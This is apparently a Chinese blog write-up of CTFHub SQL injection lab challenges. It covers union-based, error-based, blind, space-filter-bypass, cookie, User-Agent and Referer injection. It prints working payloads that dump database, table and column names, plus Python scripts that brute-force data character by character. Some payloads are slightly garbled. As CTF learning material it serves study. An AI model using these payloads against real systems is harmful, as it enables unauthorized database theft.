# CTFHub-SQL注入学习

<div class="has-toc have-toc">
</div>

## 0x00 前言

菜鸡记录汇总下SQL注入的学习过程。

## 0x01 整数型注入

很明显地发现id是注入点。<figure class="wp-block-image size-large">

<img loading="lazy" width="1388" height="249" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-95.png" alt="" class="wp-image-1799" /> </figure> 

使用`order by` 子句快速猜解表中的列数，试出列数为2。<figure class="wp-block-image size-large">

<img loading="lazy" width="396" height="107" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-97.png" alt="" class="wp-image-1801" /></figure> 

配合`union select`语句进行回显，输入`-1 union select 1,database()#`，爆破数据库<figure class="wp-block-image size-large">

<img loading="lazy" width="550" height="106" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-98.png" alt="" class="wp-image-1802" /> </figure> 

输入`-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#`，爆破表<figure class="wp-block-image size-large">

<img loading="lazy" width="1121" height="122" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-99.png" alt="" class="wp-image-1803" /> </figure> 

输入`-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag')#`，爆破字段<figure class="wp-block-image size-large">

<img loading="lazy" width="1142" height="130" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-101.png" alt="" class="wp-image-1805" /> </figure> 

输入`-1 union select 1,(select * from flag)#`，得到flag字段的存储数据。<figure class="wp-block-image size-large">

<img loading="lazy" width="661" height="105" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-102.png" alt="" class="wp-image-1806" /> </figure> 

## 0x02 字符型注入

题目：SQL注入 字符型注入, 尝试获取数据库中的 flag

使用`order by` 子句快速猜解表中的列数，试出列数为2。<figure class="wp-block-image size-large">

<img loading="lazy" width="459" height="117" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-103.png" alt="" class="wp-image-1809" /> </figure> 

输入`-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#`，爆表<figure class="wp-block-image size-large">

<img loading="lazy" width="1146" height="122" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-104.png" alt="" class="wp-image-1811" /> </figure> 

输入`-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag')#`，爆破字段<figure class="wp-block-image size-large">

<img loading="lazy" width="1148" height="123" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-105.png" alt="" class="wp-image-1813" /> </figure> 

输入`-1' union select 1,(select * from flag)#`，得到flag字段的存储数据。<figure class="wp-block-image size-large">

<img loading="lazy" width="681" height="98" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-106.png" alt="" class="wp-image-1814" /> </figure> 

## 0x03 报错注入

输入`1 union select count(),concat(database(),floor(rand(0)2))x from information_schema.columns group by x`，爆出数据库为sqli。<figure class="wp-block-image size-large">

<img loading="lazy" width="1387" height="224" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-107.png" alt="" class="wp-image-1820" /> </figure> 

输入`1 union select count(*),concat((select table_name from information_schema.tables where table_schema=database()),floor(rand(0)*2))x from information_schema.columns group by x`，报错，原因是结果返回多行数据。<figure class="wp-block-image size-large">

<img loading="lazy" width="1102" height="107" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-108.png" alt="" class="wp-image-1824" /> </figure> 

使用limit子句，被用于强制 select语句返回指定的记录数。limit接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。<figure class="wp-block-image size-large">

<img loading="lazy" width="1123" height="100" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-111.png" alt="" class="wp-image-1829" /></figure> 

得到两个表名，`news`和`flag`，使用同样的方法，输入`1 union select count(),concat((select column_name from information_schema.columns where table_name='flag' limit 0,1),floor(rand(0)2))x from information_schema.columns group by x`，继续爆破字段名。<figure class="wp-block-image size-large">

<img loading="lazy" width="1306" height="99" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-112.png" alt="" class="wp-image-1831" /> </figure> 

输入`1 union select count(),concat((select flag from flag),floor(rand(0)2))x from information_schema.columns group by x`，得到flag。<figure class="wp-block-image size-large">

<img loading="lazy" width="1295" height="95" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-113.png" alt="" class="wp-image-1833" /> </figure> 

## 0x04 布尔盲注

输入`select * from news where id=1 and if(1,sleep(4),null)`发现有时延，存在注入。简单写个脚本来爆破。

<pre class="wp-block-code"><code>import requests
dic = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_@!#$^&*()/&lt;&gt;.&#91;]'
url = "http://challenge-214ca254e588d83f.sandbox.ctfhub.com:10800/"
flag= ''

for i in range(1,10):
	for x in dic:
		data={
			'id':'1 and (if(substr(database(),%d,1)=\'%s\',sleep(4),null))' %(i,x)
		}
		try:
			res=requests.get(url,data,timeout=4)
		except requests.exceptions.ReadTimeout:
			flag=flag+x
			print(flag)
			break
print(flag)	</code></pre>

成功得到数据库名称，继续构造语句。<figure class="wp-block-image size-full">

<img loading="lazy" width="48" height="95" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-1.png" alt="" class="wp-image-2076" /> </figure> 

输入`1 and (select count(table_name) from information_schema.tables  where table_schema=database())=2`，得到表的数量。<figure class="wp-block-image size-full">

<img loading="lazy" width="1199" height="57" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-2.png" alt="" class="wp-image-2077" /> </figure> 

修改id为`1 and if(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),%d,1)=\'%s\',sleep(4),null)`，得到可疑的表flag。继续修改成`1 and if(substr((select column_name from information_schema.columns where table_name=\'flag\' limit 0,1),%d,1)=\'%s\',sleep(4),null)`，得到可疑字段名flag。最后，修改为`1 and if(substr((select flag from flag),%d,1)=\'%s\',sleep(4),null)`，扩大range。得到flag。<figure class="wp-block-image size-full">

<img loading="lazy" width="391" height="125" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-3.png" alt="" class="wp-image-2084" /> </figure> 

做完发现，把题目想复杂了一丢丢，脚本可以再简化一下(下面未测试)。

<pre class="wp-block-code"><code>
import requests
dic = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_@!#$^&*()/&lt;&gt;.&#91;]'
url = "http://challenge-214ca254e588d83f.sandbox.ctfhub.com:10800/"
text= 'query_success'
flag= ''

for i in range(1,10):
	for x in dic:
		data={
			'id':'1 and substr(database(),%d,1)=\'%s\'' %(i,x)
		}
		res=requests.get(url,data)
		if text in res.text:
			flag=flag+x
			print(flag)
			break
print(flag)	</code></pre>

## 0x05 时间盲注

直接用上一题的脚本，改个url就能跑出来了。

## 0x06 MySQL结构

构造`-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#`<figure class="wp-block-image size-full">

<img loading="lazy" width="1331" height="245" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-5.png" alt="" class="wp-image-2091" /> </figure> 

继续构造`-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='vpkaqldokv'#`<figure class="wp-block-image size-full">

<img loading="lazy" width="1305" height="114" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-6.png" alt="" class="wp-image-2093" /> </figure> 

最后构造`-1 union select 1,group_concat(gtlvsmcstd) from vpkaqldokv#`，成功得到flag。<figure class="wp-block-image size-full">

<img loading="lazy" width="857" height="107" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-7.png" alt="" class="wp-image-2094" /> </figure> 

## 0x07 过滤空格

构造上一题类似的语句，用`/**/`绕过空格。`-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()#`<figure class="wp-block-image size-full">

<img loading="lazy" width="245" height="83" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-8.png" alt="" class="wp-image-2097" /> </figure> 

构造`-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='txoypyrige'#`<figure class="wp-block-image size-full">

<img loading="lazy" width="191" height="70" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-9.png" alt="" class="wp-image-2098" /> </figure> 

最后，构造`-1/**/union/**/select/**/1,group_concat(affqveqsqw)/**/from/**/txoypyrige#`<figure class="wp-block-image size-full">

<img loading="lazy" width="399" height="78" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-10.png" alt="" class="wp-image-2099" /> </figure> 

## 0x08 Cookie注入

<figure class="wp-block-image size-full">

<img loading="lazy" width="377" height="134" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-11.png" alt="" class="wp-image-2101" /> </figure> 

打开cookie，找到注入点。<figure class="wp-block-image size-full">

<img loading="lazy" width="836" height="125" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-12.png" alt="" class="wp-image-2102" /> </figure> 

修改id的value即可实现注入。<figure class="wp-block-image size-full">

<img loading="lazy" width="1296" height="107" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-15.png" alt="" class="wp-image-2107" /></figure> 

## 0x09 UA注入

<figure class="wp-block-image size-full">

<img loading="lazy" width="1152" height="211" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-16.png" alt="" class="wp-image-2109" /> </figure> 

打开bp，在UA构造注入语句。<figure class="wp-block-image size-full">

<img loading="lazy" width="947" height="146" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-20.png" alt="" class="wp-image-2113" /></figure> 

## 0x0A Refer注入

<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-21.png" alt="" class="wp-image-2116" width="255" height="127" /> </figure> 

同样使用bp构造注入语句。<figure class="wp-block-image size-full">

<img loading="lazy" width="934" height="301" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/image-27.png" alt="" class="wp-image-2123" /></figure>
